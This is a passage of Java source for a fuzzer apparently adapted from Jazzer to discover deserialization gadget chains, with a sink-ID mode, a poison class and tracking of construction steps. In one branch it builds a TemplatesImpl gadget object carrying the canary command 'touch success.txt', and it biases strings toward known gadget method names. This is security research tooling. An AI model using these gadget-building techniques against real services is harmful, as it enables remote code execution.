// Copyright 2021 Code Intelligence GmbH
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package com.code_intelligence.jazzer.autofuzz;

import com.code_intelligence.jazzer.api.AutofuzzConstructionException;
import com.code_intelligence.jazzer.api.AutofuzzInvocationException;
import com.code_intelligence.jazzer.api.Consumer1;
import com.code_intelligence.jazzer.api.Consumer2;
import com.code_intelligence.jazzer.api.Consumer3;
import com.code_intelligence.jazzer.api.Consumer4;
import com.code_intelligence.jazzer.api.Consumer5;
import com.code_intelligence.jazzer.api.Function1;
import com.code_intelligence.jazzer.api.Function2;
import com.code_intelligence.jazzer.api.Function3;
import com.code_intelligence.jazzer.api.Function4;
import com.code_intelligence.jazzer.api.Function5;
import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.utils.Utils;
import io.github.classgraph.ClassGraph;
import io.github.classgraph.ClassInfoList;
import io.github.classgraph.ClassInfo;
import io.github.classgraph.ScanResult;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Executable;
import java.lang.reflect.GenericArrayType;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.lang.reflect.ParameterizedType;
import java.lang.reflect.Type;
import java.lang.reflect.TypeVariable;
import java.lang.reflect.WildcardType;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.jodah.typetools.TypeResolver;
import net.jodah.typetools.TypeResolver.Unknown;

// import org.apache.log4j.Logger;
import org.apache.commons.lang3.ClassUtils;
import java.util.concurrent.ThreadLocalRandom;

import java.io.Serializable;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

public class Meta {

  // private static final Logger LOGGER = Logger.getLogger(Meta.class);

  static WeakHashMap<Class<?>, List<Class<?>>> implementingClassesCache = new WeakHashMap<>();
  static WeakHashMap<Class<?>, List<Class<?>>> nestedBuilderClassesCache = new WeakHashMap<>();
  static WeakHashMap<Class<?>, List<Method>> originalObjectCreationMethodsCache =
      new WeakHashMap<>();
  static WeakHashMap<Class<?>, List<Method>> cascadingBuilderMethodsCache = new WeakHashMap<>();

  // Create a cache of well-formed objects for the specific path trying to be
  // concretized This cache is cleared each time a new path is being tried to
  // be concretized 
  // We use a linkedhashmao because lets say in case a class requires an object that implements
  // a specific interface, we want to use the object that was the most recently constructed
  // to keep the chain ordering intact
  public static Map<Class<?>, Object> localCache = new LinkedHashMap<>();

  // This keeps a cache of the `class` variables that are candidates for being instantiated with when a variable of type
  // Class.class is requested 
  public static Class<?>[] classCache; 
  // public static Class<?>[] classCache = {Templates.class, ObjectBean.class};

  // This data structure is used for the dynamic sink ID  and crash triage mode
  // to log the steps taken to generate an instance of a class so that during
  // post-processing phase after a class is flagged as vulnerable we can see if
  // the vulnerable object is actually used in the gadget belonging to the
  // vulnerable class
  public static List<String> constructionSteps = new ArrayList<>();

  // This stack keeps track of which reference datatype is currently in the
  // process of being instantiated. We need this during the sinkID mode to
  // identify which reference datatype allowed the poison class to be loaded
  // in. The idea is to keep pushing to the stack every time `consume` is
  // called and pop from the stack every time it returns. So when an exception
  // is thrown from the poison class being loaded we can unwind this init stack
  // to find out which reference datatype was being instantiated
  public static Stack<String> initStack = new Stack<>();

  public static boolean isSinkIDMode = false;
  public static boolean isCrashTriageMode = false;

  public static Object autofuzz(FuzzedDataProvider data, Method method) {
    //System.out.println("Creating arguments for the method3");
    return autofuzz(data, method, null);
  }

  static Object autofuzz(FuzzedDataProvider data, Method method, AutofuzzCodegenVisitor visitor) {
    //System.out.println("Creating arguments for the method4");
    Object result;
    if (Modifier.isStatic(method.getModifiers())) {
      if (visitor != null) {
        // This group will always have two elements: The class name and the method call.
        visitor.pushGroup(
            String.format("%s.", method.getDeclaringClass().getCanonicalName()), "", "");
      }
      try {
        result = autofuzz(data, method, null, visitor);
      } finally {
        if (visitor != null) {
          visitor.popGroup();
        }
      }
    } else {
      if (visitor != null) {
        // This group will always have two elements: The thisObject and the method call.
        // Since the this object can be a complex expression, wrap it in paranthesis.
        visitor.pushGroup("(", ").", "");
      }
      Object thisObject = consume(data, method.getDeclaringClass(), visitor);
      if (thisObject == null) {
        throw new AutofuzzConstructionException();
      }
      try {
        result = autofuzz(data, method, thisObject, visitor);
      } finally {
        if (visitor != null) {
          visitor.popGroup();
        }
      }
    }
    return result;
  }

  public static Object autofuzz(FuzzedDataProvider data, Method method, Object thisObject) {
    //System.out.println("Creating arguments for the method1");
    return autofuzz(data, method, thisObject, null);
  }

  static Object autofuzz(
      FuzzedDataProvider data, Method method, Object thisObject, AutofuzzCodegenVisitor visitor) {
    //System.out.println("Creating arguments for the method");
    if (visitor != null) {
      visitor.pushGroup(String.format("%s(", method.getName()), ", ", ")");
    }
    Object[] arguments = consumeArguments(data, method, visitor);
    if (visitor != null) {
      visitor.popGroup();
    }
    try {
      //System.out.println("Invoking the method with the constructed arguments");
      return method.invoke(thisObject, arguments);
    } catch (IllegalAccessException | IllegalArgumentException | NullPointerException e) {
      // We should ensure that the arguments fed into the method are always valid.
      throw new AutofuzzError(getDebugSummary(method, thisObject, arguments), e);
    } catch (InvocationTargetException e) {
      throw new AutofuzzInvocationException(e.getCause());
    }
  }

  public static <R> R autofuzz(FuzzedDataProvider data, Constructor<R> constructor) {
    return autofuzz(data, constructor, null);
  }

  static <R> R autofuzz(
      FuzzedDataProvider data, Constructor<R> constructor, AutofuzzCodegenVisitor visitor) {
    if (visitor != null) {
      // getCanonicalName is correct also for nested classes.
      visitor.pushGroup(
          String.format("new %s(", constructor.getDeclaringClass().getCanonicalName()), ", ", ")");
    }

    Object[] arguments = consumeArguments(data, constructor, visitor);

    if (visitor != null) {
      visitor.popGroup();
    }
    try {
      constructor.setAccessible(true);
      return constructor.newInstance(arguments);
    } catch (InstantiationException | IllegalAccessException | IllegalArgumentException e) {
      // This should never be reached as the logic in consume should prevent us from e.g. calling
      // constructors of abstract classes or private constructors.
      throw new AutofuzzError(getDebugSummary(constructor, null, arguments), e);
    } catch (InvocationTargetException e) {
      throw new AutofuzzInvocationException(e.getCause());
    } 

  }

  @SuppressWarnings("unchecked")
  public static <T1> void autofuzz(FuzzedDataProvider data, Consumer1<T1> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Consumer1.class, func.getClass());
    func.accept((T1) consumeChecked(data, types, 0));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2> void autofuzz(FuzzedDataProvider data, Consumer2<T1, T2> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Consumer2.class, func.getClass());
    func.accept((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3> void autofuzz(FuzzedDataProvider data, Consumer3<T1, T2, T3> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Consumer3.class, func.getClass());
    func.accept((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3, T4> void autofuzz(
      FuzzedDataProvider data, Consumer4<T1, T2, T3, T4> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Consumer4.class, func.getClass());
    func.accept((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2), (T4) consumeChecked(data, types, 3));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3, T4, T5> void autofuzz(
      FuzzedDataProvider data, Consumer5<T1, T2, T3, T4, T5> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Consumer5.class, func.getClass());
    func.accept((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2), (T4) consumeChecked(data, types, 3),
        (T5) consumeChecked(data, types, 4));
  }

  @SuppressWarnings("unchecked")
  public static <T1, R> R autofuzz(FuzzedDataProvider data, Function1<T1, R> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Function1.class, func.getClass());
    return func.apply((T1) consumeChecked(data, types, 0));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, R> R autofuzz(FuzzedDataProvider data, Function2<T1, T2, R> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Function2.class, func.getClass());
    return func.apply((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3, R> R autofuzz(FuzzedDataProvider data, Function3<T1, T2, T3, R> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Function3.class, func.getClass());
    return func.apply((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3, T4, R> R autofuzz(
      FuzzedDataProvider data, Function4<T1, T2, T3, T4, R> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Function4.class, func.getClass());
    return func.apply((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2), (T4) consumeChecked(data, types, 3));
  }

  @SuppressWarnings("unchecked")
  public static <T1, T2, T3, T4, T5, R> R autofuzz(
      FuzzedDataProvider data, Function5<T1, T2, T3, T4, T5, R> func) {
    Class<?>[] types = TypeResolver.resolveRawArguments(Function5.class, func.getClass());
    return func.apply((T1) consumeChecked(data, types, 0), (T2) consumeChecked(data, types, 1),
        (T3) consumeChecked(data, types, 2), (T4) consumeChecked(data, types, 3),
        (T5) consumeChecked(data, types, 4));
  }

  public static Object consume(FuzzedDataProvider data, Class<?> type) {
    return consume(data, type, null);
  }
  
  public static Object getPreInstantiatedInterface(Class<?> type) {
      // Reverse iterate through the linked hashmap
      ListIterator<Map.Entry<Class<?>, Object>> iterator = new ArrayList<Map.Entry<Class<?>, Object>>(Meta.localCache.entrySet()).listIterator(Meta.localCache.size());
      while(iterator.hasPrevious()) {
          Map.Entry<Class<?>, Object> entry = iterator.previous();
          // System.out.println("Checking object of type:" + entry.getKey().toString());
          // if (entry.getKey().equals(type)) {
          //     return entry.getValue();
          // }
          // Get all interfaces recursively implemented by this class and see if it matches the 
          // one requested here 
          List<Class<?>> allInterfaces = ClassUtils.getAllInterfaces(entry.getKey());
          if (allInterfaces.contains(type)) {
              //System.out.println("Returning a preinstantiated interface from object:" + entry.getKey().toString() );
              return entry.getValue();
          }
      }
      return null;
  }

  // Invariant: The Java source code representation of the returned object visited by visitor must
  // represent an object of the same type as genericType. For example, a null value returned for
  // the genericType Class<java.lang.String> should lead to the generated code
  // "(java.lang.String) null", not just "null". This makes it possible to safely use consume in
  // recursive argument constructions.
  static Object consume(FuzzedDataProvider data, Type genericType, AutofuzzCodegenVisitor visitor) {

    Class<?> type = getRawType(genericType);
    // System.out.println("Instantiating raw type:" + type.toString()) ;
    // System.out.println("Instantiating generic type:" + genericType.getTypeName()) ;
    if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
        // System.out.println("Instantiating raw type:" + type.toString()) ;
        constructionSteps.add(String.format("Instantiating raw type:%s", type.toString()));
        // Adding the type that is being instantiated
        initStack.push(type.toString());
    }

    // // If the exact type for a path node object being instantiated already
    // // exists in the cache, then there is 75% chance that it is returned as-is
    // // This is necessary do because since a path contains method invocations
    // // then there is a possibility for the a path node to have method
    // // invocations from the same class. For such cases, instantiating different
    // // objects for the same class does not make sense so we return a
    // // pre-instantiated object of the same type if it exists.
    // //
    // // However, we only do this 75% of the times is because in certain instances we may
    // // need to generate distinct objects of the same class. A concrete example of this was
    // // the ground truth chain in Rome that required two distinct objects of type `ObjectBean`
    // // to be created. This would not happen if we didn't adopt this probabilistic strategy
	// int choice3 = ThreadLocalRandom.current().nextInt(0, 4); 
    // if (choice3 <= 2) { 
    //     Object exactObject = Meta.localCache.getOrDefault(type, null);
    //     if (exactObject != null) {
    //       // System.out.println("Returning exact object type");
    //       if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
    //           constructionSteps.add(String.format("Returning exact object type:%s", exactObject.getClass()));
    //       }
    //       return exactObject;
    //     } 
    // } 
    Object exactObject = Meta.localCache.getOrDefault(type, null);
    if (exactObject != null) {
      // System.out.println("Returning exact object type");
      if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
          constructionSteps.add(String.format("Returning exact object type:%s", exactObject.getClass()));
      }
      return exactObject;
    } 
    // We roll a dice and see if we want to try returning a pre-instantiated
    // object implementing a requested interface or instead build the requested
    // object from scratch. The reason we do this is in some instances you may
    // not want to concretize a node along the path with a previously seen
    // object but instead build the object for it from scratch. We currently
    // bias towards pre-instantiation by 75% and 25% chance to build the object
    // from scratch 
	int choice1 = ThreadLocalRandom.current().nextInt(0, 4); 
    if (choice1 <= 2) { 
      // System.out.println("Returning a pre-instantiated interface");
      Object preInstantiated = getPreInstantiatedInterface(type);
      if (preInstantiated != null) {
        if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
          constructionSteps.add(String.format("Returning a pre-instantiated interface:%s", preInstantiated.getClass()));
        }
        return preInstantiated;
      }
      // System.out.println("No pre-instantiated interface exists, continuing..");
      // if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
      //   constructionSteps.add("No pre-instantiated interface exists, continuing..");   
      // }
    }

    if (type == byte.class || type == Byte.class) {
      byte result = data.consumeByte();
      if (visitor != null)
        visitor.pushElement(String.format("(byte) %s", result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == short.class || type == Short.class) {
      short result = data.consumeShort();
      if (visitor != null)
        visitor.pushElement(String.format("(short) %s", result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == int.class || type == Integer.class) {
      // We upper bound the consumeInt to only give integers between this range 
      // because in one specific scenario while trying to intiialize StaticBucketMap
      // in CommonsCollections there was a constructor that took a user-supplied `int` number of locks
      // to setup. If jazzer would pass in a large number, this would take ages to initialize
      // This is why we tightly bound the integer passed back instead to be between 1 and 3 
      int result = data.consumeInt(1,3);
      if (visitor != null)
        visitor.pushElement(Integer.toString(result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == long.class || type == Long.class) {
      long result = data.consumeLong();
      if (visitor != null)
        visitor.pushElement(String.format("%sL", result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == float.class || type == Float.class) {
      float result = data.consumeFloat();
      if (visitor != null)
        visitor.pushElement(String.format("%sF", result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == double.class || type == Double.class) {
      double result = data.consumeDouble();
      if (visitor != null)
        visitor.pushElement(Double.toString(result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == boolean.class || type == Boolean.class) {
      boolean result = data.consumeBoolean();
      if (visitor != null)
        visitor.pushElement(Boolean.toString(result));
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    } else if (type == char.class || type == Character.class) {
      char result = data.consumeChar();
      if (visitor != null)
        visitor.addCharLiteral(result);
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return result;
    }
    // Return null for non-primitive and non-boxed types in ~5% of the cases.
    // TODO: We might want to return null for boxed types sometimes, but this is complicated by the
    //       fact that TypeUtils can't distinguish between a primitive type and its wrapper and may
    //       thus easily cause false-positive NullPointerExceptions.
    // XXX: Since we are not interested in null objects being created, we comment this feature out
    // if (!type.isPrimitive() && data.consumeByte((byte) 0, (byte) 19) == 0) {
    //   if (visitor != null) {
    //     if (type == Object.class) {
    //       visitor.pushElement("null");
    //     } else {
    //       visitor.pushElement(String.format("(%s) null", type.getCanonicalName()));
    //     }
    //   }
    //   return null;
    // }
    if (type == String.class || type == CharSequence.class) {
      // System.out.println("Returning string");
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      int choice = ThreadLocalRandom.current().nextInt(0, 5); 
      constructionSteps.add(String.format("Making choice for String.class:%d", choice));
      // System.out.println("Making choice:" + choice);
      if (choice == 0) {
        return (String) "outputProperties";
      } else if (choice == 1) {
        return (String) "toString";
      } else if (choice == 2) {
        return (String) "lowestSetBit";
      } else if (choice == 3) { // execute and entrySet Needed for groovy
        return (String) "execute";
      } else {
        return (String) "entrySet";
      }
      // String result = data.consumeString(consumeArrayLength(data, 1)); if (visitor != null)
      //   visitor.addStringLiteral(result);
      // return result;
    } else if (type.isArray()) {
      if (type == byte[].class) {
        byte[] result = data.consumeBytes(consumeArrayLength(data, Byte.BYTES));
        if (visitor != null) {
          visitor.pushElement(IntStream.range(0, result.length)
                                  .mapToObj(i -> "(byte) " + result[i])
                                  .collect(Collectors.joining(", ", "new byte[]{", "}")));
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        return result;
      } else if (type == int[].class) {
        int[] result = data.consumeInts(consumeArrayLength(data, Integer.BYTES));
        if (visitor != null) {
          visitor.pushElement(Arrays.stream(result)
                                  .mapToObj(String::valueOf)
                                  .collect(Collectors.joining(", ", "new int[]{", "}")));
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        return result;
      } else if (type == short[].class) {
        short[] result = data.consumeShorts(consumeArrayLength(data, Short.BYTES));
        if (visitor != null) {
          visitor.pushElement(IntStream.range(0, result.length)
                                  .mapToObj(i -> "(short) " + result[i])
                                  .collect(Collectors.joining(", ", "new short[]{", "}")));
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        return result;
      } else if (type == long[].class) {
        long[] result = data.consumeLongs(consumeArrayLength(data, Long.BYTES));
        if (visitor != null) {
          visitor.pushElement(Arrays.stream(result)
                                  .mapToObj(e -> e + "L")
                                  .collect(Collectors.joining(", ", "new long[]{", "}")));
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        return result;
      } else if (type == boolean[].class) {
        boolean[] result = data.consumeBooleans(consumeArrayLength(data, 1));
        if (visitor != null) {
          visitor.pushElement(
              Arrays.toString(result).replace(']', '}').replace("[", "new boolean[]{"));
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        return result;
      } else {
        if (visitor != null) {
          visitor.pushGroup(
              String.format("new %s[]{", type.getComponentType().getName()), ", ", "}");
        }
        int remainingBytesBeforeFirstElementCreation = data.remainingBytes();
        Object firstElement = consume(data, type.getComponentType(), visitor);
        int remainingBytesAfterFirstElementCreation = data.remainingBytes();
        int sizeOfElementEstimate =
            remainingBytesBeforeFirstElementCreation - remainingBytesAfterFirstElementCreation;
        Object array = Array.newInstance(
            type.getComponentType(), consumeArrayLength(data, sizeOfElementEstimate));
        for (int i = 0; i < Array.getLength(array); i++) {
          if (i == 0) {
            Array.set(array, i, firstElement);
          } else {
            Array.set(array, i, consume(data, type.getComponentType(), visitor));
          }
        }
        if (visitor != null) {
          if (Array.getLength(array) == 0) {
            // We implicitly pushed the first element with the call to consume above, but it is not
            // part of the array.
            visitor.popElement();
          }
          visitor.popGroup();
        }
        if (Meta.isSinkIDMode) {
          initStack.pop();
        }
        // XXX: You either returned a well-instantiated array or instead return
        // a null object in case a Object[] array is requested. We added this
        // because of the ground truth chain requires instantiating this
        // requested argument with a null object when building it 
	    int choice = ThreadLocalRandom.current().nextInt(0, 2); 
        if (choice == 0) {
            return array;
        } else {
            return null;
        }
      }
    } else if (type == ByteArrayInputStream.class || type == InputStream.class) {
      byte[] array = data.consumeBytes(consumeArrayLength(data, Byte.BYTES));
      if (visitor != null) {
        visitor.pushElement(IntStream.range(0, array.length)
                                .mapToObj(i -> "(byte) " + array[i])
                                .collect(Collectors.joining(
                                    ", ", "new java.io.ByteArrayInputStream(new byte[]{", "})")));
      }
      if (Meta.isSinkIDMode) {
        initStack.pop();
      }
      return new ByteArrayInputStream(array);
    } else if (type == Map.class) {
      ParameterizedType mapType = null;
      try {
        mapType = (ParameterizedType) genericType;
      } catch (ClassCastException e) {
	      int choice = ThreadLocalRandom.current().nextInt(0, 2); 
          Map<String, String> dummyMap;
          if (choice == 0) {
              dummyMap = new HashMap<String, String>() {{
                  put("foo", "bar");
              }};
          } else {
              dummyMap = new HashMap<String, String>() {{
                  put("baz", "boo");
              }};
          }
          if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
             constructionSteps.add(String.format("Found raw type instantiation, returning a raw hashmap, choice:%d", choice));
          }
          //System.out.println("Found raw type instantiation, returning a raw hashmap" + dummyMap);
          if (Meta.isSinkIDMode) {
              initStack.pop();
          }
          return dummyMap; 
      }
      if (mapType.getActualTypeArguments().length != 2) {
        throw new AutofuzzError(
            "Expected Map generic type to have two type parameters: " + mapType);
      }
      Type keyType = mapType.getActualTypeArguments()[0];
      Type valueType = mapType.getActualTypeArguments()[1];
      if (visitor != null) {
        // Do not use Collectors.toMap() since it cannot handle null values.
        // Also annotate the type of the entry stream since it might be empty, in which case type
        // inference on the accumulator could fail.
        visitor.pushGroup(
            String.format("java.util.stream.Stream.<java.util.AbstractMap.SimpleEntry<%s, %s>>of(",
                keyType.getTypeName(), valueType.getTypeName()),
            ", ",
            ").collect(java.util.HashMap::new, (map, e) -> map.put(e.getKey(), e.getValue()), java.util.HashMap::putAll)");
      }
      int remainingBytesBeforeFirstEntryCreation = data.remainingBytes();
      if (visitor != null) {
        visitor.pushGroup("new java.util.AbstractMap.SimpleEntry<>(", ", ", ")");
      }
      Object firstKey = consume(data, keyType, visitor);
      Object firstValue = consume(data, valueType, visitor);
      if (visitor != null) {
        visitor.popGroup();
      }
      int remainingBytesAfterFirstEntryCreation = data.remainingBytes();
      int sizeOfElementEstimate =
          remainingBytesBeforeFirstEntryCreation - remainingBytesAfterFirstEntryCreation;
      int mapSize = consumeArrayLength(data, sizeOfElementEstimate);
      Map<Object, Object> map = new HashMap<>(mapSize);
      for (int i = 0; i < mapSize; i++) {
        if (i == 0) {
          map.put(firstKey, firstValue);
        } else {
          if (visitor != null) {
            visitor.pushGroup("new java.util.AbstractMap.SimpleEntry<>(", ", ", ")");
          }
          map.put(consume(data, keyType, visitor), consume(data, valueType, visitor));
          if (visitor != null) {
            visitor.popGroup();
          }
        }
      }
      if (visitor != null) {
        if (mapSize == 0) {
          // We implicitly pushed the first entry with the call to consume above, but it is not
          // part of the array.
          visitor.popElement();
        }
        visitor.popGroup();
      }
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return map;
    } else if (type.isEnum()) {
      Enum<?> enumValue = (Enum<?>) data.pickValue(type.getEnumConstants());
      if (visitor != null) {
        visitor.pushElement(String.format("%s.%s", type.getName(), enumValue.name()));
      }
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return enumValue;
    } else if (type == Class.class) {
      // // Populate the class cache
      // int choice = ThreadLocalRandom.current().nextInt(0, classCache.length); 
      // Class<?> member = classCache[choice]; 
      // // System.out.println("Getting member:" + member.getName());
      // if (visitor != null)
      //   visitor.pushElement(String.format("%s.class", YourAverageJavaClass.class.getName()));
      // if (Meta.isSinkIDMode) {
      //     initStack.pop();
      // }
      // return member;
      return YourAverageJavaClass.class;
    } else if (type == Method.class) {
      if (visitor != null) {
        throw new AutofuzzError("codegen has not been implemented for Method.class");
      }
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return data.pickValue(sortExecutables(YourAverageJavaClass.class.getMethods()));
    } else if (type == Constructor.class) {
      if (visitor != null) {
        throw new AutofuzzError("codegen has not been implemented for Constructor.class");
      }
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return data.pickValue(sortExecutables(YourAverageJavaClass.class.getConstructors()));
    } else if (type.isInterface() || Modifier.isAbstract(type.getModifiers())) {
      if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
          constructionSteps.add("Interface/Abstract type detected..choosing a class");
      }
      // System.out.println("Interface/Abstract type detected..choosing a class");
      List<Class<?>> implementingClasses = implementingClassesCache.get(type);
      if (implementingClasses == null) {
        ClassGraph classGraph =
            new ClassGraph().enableClassInfo().enableInterClassDependencies().rejectPackages(
                "jaz.*");
        classGraph.rejectPackages("org.jgrapht.*");
        classGraph.rejectPackages("org.jheaps.*");
        classGraph.rejectPackages("org.antlr.*");
        classGraph.rejectPackages("org.apache.commons.text.*");

        classGraph.rejectPackages("org.apache.commons.lang3.*");
        classGraph.rejectPackages("org.apache.log4j.*");
        classGraph.rejectPackages("org.slf4j.*");
        classGraph.rejectPackages("javassist.*");
        if (!isTest()) {
          classGraph.rejectPackages("com.code_intelligence.jazzer.*");
        }
        try (ScanResult result = classGraph.scan()) {
          ClassInfoList children =
              type.isInterface() ? result.getClassesImplementing(type) : result.getSubclasses(type);
          implementingClasses =
              children.getStandardClasses().filter(cls -> !cls.isAbstract()).loadClasses();
          implementingClassesCache.put(type, implementingClasses);
        }
      }
      if (implementingClasses.isEmpty()) {
        if (isDebug()) {
          throw new AutofuzzConstructionException(String.format(
              "Could not find classes implementing %s on the classpath", type.getName()));
        } else {
          throw new AutofuzzConstructionException();
        }
      }
      // for (Class cls: implementingClasses) {
      //   System.out.println("Class:" +  cls.getName());
      // }
      // System.exit(1);
      if (visitor != null) {
        // This group will always have a single element: The instance of the implementing class.
        visitor.pushGroup(String.format("(%s) ", type.getName()), "", "");
      }
      Object result = consume(data, data.pickValue(implementingClasses), visitor);
      if (visitor != null) {
        visitor.popGroup();
      }
      if (Meta.isSinkIDMode) {
          initStack.pop();
      }
      return result;
    } else if (type == Object.class) { 
      // We added this specific case because the default behavior performed by aytofuzz
      // was to try to instantiate using one of its constructors and the object class is
      // not serializable. Instead we decide whether we want to pre-instantiated object as a part of this
      // chain or send a string or a map object 
      // System.out.println("Returning an object");
      
      // XXX: If you're going to be adding more choices to this make sure its added after the fifth
      // choice because we are reserving that index specifically for a edge case handling for poison class
      // during Sink ID
	  int choice = ThreadLocalRandom.current().nextInt(0, 7); 
      // System.exit(1);
      if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
        constructionSteps.add(String.format("Making choice for object.class:%d", choice));
        // We pop this stack only if we are not going to be instantiating the poison class.
        // The reason is with that choice we know the object instantiation is going to fail
        if (choice != 5) {
            initStack.pop();
        }
      }
      //System.out.println(String.format("Making choice for object.class:%d", choice));
      if (choice == 0) {
        return (Object) "key";
      }
      else if (choice == 1) {
        Map<String, String> dummy = new HashMap<String, String>() {{
            put("foo", "bar");
        }};
        return (Object) dummy;
      }
      else if (choice == 2) {
        try { 
            return (Object) createTemplatesImpl("touch success.txt", TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
      }
      else if (choice == 3) {
        return (Object) "outputProperties";
      } else if (choice == 4) {
        String payload = "outputProperties";
        return (Object) payload.getBytes();
      } else if (choice == 5 && Meta.isSinkIDMode) { 
        // If we are operating in the sink ID mode then we may put in the
        // poison class sometimes as well if just an Object is being
        // initialized. We make this non-deterministic since we may want to be
        // different classes where this object is being initialized and not
        // just at the first instance where its found 
        Object obj = null;
        try {
            Class<?> poisonClass = Class.forName("jaz.Zer");
            // At this point of instantiation Jazzer automatically will flag the class that is being instantiated
            Object result = consume(data, poisonClass, visitor);
            // obj = poisonClass.newInstance();
        } catch (ClassNotFoundException e) {
            System.out.println("Poison class not found, exiting");
            System.exit(1);
        }
        return obj;
      } else {
        // Choose a random element from the cache to send back if the cache is not empty
        // If the cache is empty just send in a string object
        if (Meta.localCache.size() == 0) {
          if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
            constructionSteps.add(String.format("Empty cache returning string 'key'"));
          }
          return (Object) "key";
        }
        else {
          int idx = ThreadLocalRandom.current().nextInt(0, Meta.localCache.size());
          int counter = 0;
          for(Map.Entry<Class<?>, Object> e: Meta.localCache.entrySet()) {
             if (counter == idx) {
               //System.out.println("Returning:" + e.getKey().toString());
               if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
                 constructionSteps.add(String.format("Returning object of type:%s", e.getValue().getClass()));
               }
               return e.getValue();
             }
             counter += 1;
          }
        }
      }
    } else if (type.getConstructors().length > 0) {
      // // Debug piece of code to instantiate specific constructors
      // Constructor[] ct = type.getConstructors();
      // Constructor<?> constructor = null;
      // for (int i = 0; i < ct.length; i++) {
      //     System.out.println("Constructor:" + ct[i].toString());
      //     if(ct[i].toString().equals("public org.apache.commons.collections.FastHashMap(java.util.Map)"))
      //         constructor = ct[i];
      //     if(ct[i].toString().equals("public org.apache.commons.collections.map.SingletonMap(java.lang.Object,java.lang.Object)"))
      //         constructor = ct[i];
      // }
      // if (constructor == null) {
      //     constructor = data.pickValue(sortExecutables(type.getConstructors()));
     // }
  
      Constructor<?> constructor = data.pickValue(sortExecutables(type.getConstructors()));
      if (Meta.isSinkIDMode || Meta.isCrashTriageMode) {
          constructionSteps.add(String.format("Instantiating constructor:%s", constructor.toString()));
      }
      // // CR: Apply setters probabilistically. The reason we do that is because
